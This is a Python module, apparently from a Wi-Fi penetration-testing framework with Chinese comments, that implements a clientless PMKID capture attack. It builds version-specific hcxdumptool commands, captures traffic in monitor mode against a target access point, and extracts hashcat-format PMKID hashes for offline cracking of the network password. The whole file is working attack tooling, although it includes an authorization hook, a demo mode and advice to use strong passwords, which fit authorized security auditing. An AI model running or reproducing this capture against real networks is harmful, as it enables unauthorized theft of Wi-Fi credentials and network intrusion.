"""PMKID 无客户端攻击（hcxdumptool + hcxtools）."""

from __future__ import annotations

import asyncio
import re
import time
from pathlib import Path

from .base import AttackContext, AttackModule, AttackResult, Option
from ..crack.offline import make_pmkid_line
from ..crack.tools import convert_to_22000
from ..models import normalize_mac
from ..recon.demo import demo_psk

_HCX_VERSION_RE = re.compile(r"hcxdumptool\s+v?(\d+)\.")


def _band_suffix(channel: int) -> str:
    """hcxdumptool 7.x 的信道必须带频段后缀（a=2.4G，b=5G）."""
    if 32 <= channel <= 177:
        return "b"
    return "a"


async def build_hcxdumptool_cmd(runner, iface: str, out: Path, channel: int = 0) -> list[str]:
    """按已安装的 hcxdumptool 版本生成采集命令.

    - 6.x: ``--enable_status=3``
    - 7.x: 该选项改名为 ``--rds=3``（``--enable_status`` 会直接报 unrecognized option
      并以非零码退出，导致永远抓不到包）
    """
    probe = await runner.query(["hcxdumptool", "--version"], timeout=8)
    match = _HCX_VERSION_RE.search(probe.text or "")
    major = int(match.group(1)) if match else 0
    if major >= 7:
        cmd = ["hcxdumptool", "-i", iface, "-w", str(out), "--rds=3"]
        if channel:
            cmd += ["-c", f"{channel}{_band_suffix(channel)}"]
        return cmd
    return ["hcxdumptool", "-i", iface, "-w", str(out), "--enable_status=3"]


class PMKIDCapture(AttackModule):
    id = "pmkid"
    name = "PMKID 无客户端捕获"
    category = "credential"
    description = (
        "向 AP 发送关联请求并读取 EAPOL M1 中的 RSN PMKID，无需客户端、无需 Deauth。"
        "得到 PMKID 后可离线校验 PSK；并非所有 AP 都会返回 PMKID。"
    )
    requires = ("hcxdumptool", "hcxpcapngtool", "airmon-ng")
    risk = "high"
    needs_monitor = True
    options = [
        Option("timeout", "采集时长（秒）", "int", 60, "hcxdumptool 运行时长"),
        Option("band", "频段", "select", "auto", "限制扫描频段", ["auto", "2.4", "5"]),
    ]

    def validate(self, params: dict) -> list[str]:
        issues = super().validate(params)
        if (params.get("security") or "").upper() == "WPA3":
            issues.append("纯 WPA3 目标不适用 PMKID 攻击（无 PSK 握手）")
        return issues

    async def run(self, ctx: AttackContext, params: dict) -> AttackResult:
        started = time.time()
        bssid = normalize_mac(params["bssid"])
        ssid = params.get("ssid", "")
        channel = int(params.get("channel") or 0)
        timeout = max(15, min(int(params.get("timeout") or 60), 1800))
        ctx.authorize("pmkid", bssid, ssid)
        ctx.emit("attack", f"PMKID 采集：{ssid or '<隐藏>'} · {bssid}", bssid=bssid)

        if ctx.demo:
            return await self._demo(ctx, params, bssid, ssid, channel, started)

        monitor = await ctx.monitor()
        await ctx.set_channel(channel)
        out = ctx.capture_path("pmkid", bssid, "pcapng")
        # 不依赖 hcxdumptool 版本相关的 filter 参数；抓全部，再按 BSSID 过滤
        cmd = await build_hcxdumptool_cmd(ctx.runner, monitor, out, channel)
        ctx.emit("info", f"启动 hcxdumptool（{timeout}s）：{' '.join(cmd)}")
        tail: list[str] = []

        def _on_line(line: str) -> None:
            tail.append(line)
            del tail[:-40]
            ctx.log(line)

        proc = await ctx.runner.background(cmd, delay=3.0, on_line=_on_line)
        try:
            waited = 0
            while waited < timeout:
                await asyncio.sleep(2)
                waited += 2
                if waited % 10 == 0:
                    ctx.emit("debug", f"采集中… {waited}/{timeout}s")
        finally:
            await ctx.runner.terminate(proc, timeout=5)

        if not out.exists() or out.stat().st_size == 0:
            reason = next((line for line in tail if "unrecognized option" in line), "")
            return AttackResult(
                ok=False,
                summary="hcxdumptool 未产生抓包（检查网卡/驱动/权限）",
                detail={"cmd": cmd, "output": tail[-12:], "reason": reason},
                duration=time.time() - started,
            )

        hashes_path = ctx.capture_path("pmkid", bssid, "22000")
        ok, lines, note = await convert_to_22000(ctx.runner, out, hashes_path)
        if not ok:
            return AttackResult(
                ok=False,
                summary="未从抓包中提取到 PMKID（AP 可能不支持或未响应）",
                detail={"pcapng": str(out), "convert": note[-600:]},
                duration=time.time() - started,
            )
        # hcxdumptool 会捕获周边所有 AP，这里只保留目标 BSSID
        from ..crack.offline import parse_22000
        from pathlib import Path as _Path

        target_norm = bssid.replace(":", "")
        kept = []
        for line in hashes_path.read_text(encoding="utf-8", errors="replace").splitlines():
            parsed = parse_22000(line)
            if parsed and parsed.ap_mac.replace(":", "") == target_norm:
                kept.append(line)
        if not kept:
            return AttackResult(
                ok=False,
                summary="抓包中未出现目标 AP 的 PMKID（该 AP 可能不返回 PMKID）",
                detail={"pcapng": str(out), "total_hashes": lines},
                duration=time.time() - started,
            )
        hashes_path.write_text("\n".join(kept) + "\n", encoding="utf-8")
        lines = len(kept)
        hash_path = hashes_path

        capture_id = ctx.register_capture(
            "pmkid", hash_path, bssid=bssid, ssid=ssid, meta={"source": str(out), "lines": lines}
        )
        ctx.finding(
            "AP 泄露 PMKID",
            "high",
            bssid=bssid,
            ssid=ssid,
            detail=f"无需客户端即取得 {lines} 条可离线校验的 PMKID，建议使用强口令。",
            category="capture",
        )
        return AttackResult(
            ok=True,
            summary=f"PMKID 捕获成功（{lines} 条）",
            detail={"pcapng": str(out), "hash": str(hash_path)},
            capture_id=capture_id,
            duration=time.time() - started,
        )

    async def _demo(
        self,
        ctx: AttackContext,
        params: dict,
        bssid: str,
        ssid: str,
        channel: int,
        started: float,
    ) -> AttackResult:
        psk = demo_psk(ssid)
        if not psk:
            return AttackResult(
                ok=False,
                summary="该演示目标不返回 PMKID（无 PSK / 企业网络）",
                duration=time.time() - started,
            )
        steps = [
            "将网卡切换到目标信道并进入监听模式（模拟）",
            "发送 Association Request（模拟）",
            "收到 EAPOL M1，RSN IE 中携带 PMKID",
            "PMKID 提取完成，可离线校验",
        ]
        for step in steps:
            await asyncio.sleep(0.5)
            ctx.emit("info", step, bssid=bssid)
        sta = "3c:07:54:11:22:33"
        line = make_pmkid_line(psk, ssid, bssid, sta)
        path = ctx.capture_path("pmkid", bssid, "22000")
        path.write_text(line + "\n", encoding="utf-8")
        capture_id = ctx.register_capture(
            "pmkid",
            path,
            bssid=bssid,
            ssid=ssid,
            meta={"demo": True, "station": sta, "channel": channel},
        )
        ctx.finding(
            "AP 泄露 PMKID（演示）",
            "high",
            bssid=bssid,
            ssid=ssid,
            detail="单帧即可取得 PMKID，攻击者无需等待客户端上线。",
            category="capture",
        )
        return AttackResult(
            ok=True,
            summary="PMKID 捕获成功（模拟），已生成真实可校验哈希",
            detail={"demo": True, "path": str(path), "station": sta},
            capture_id=capture_id,
            duration=time.time() - started,
        )
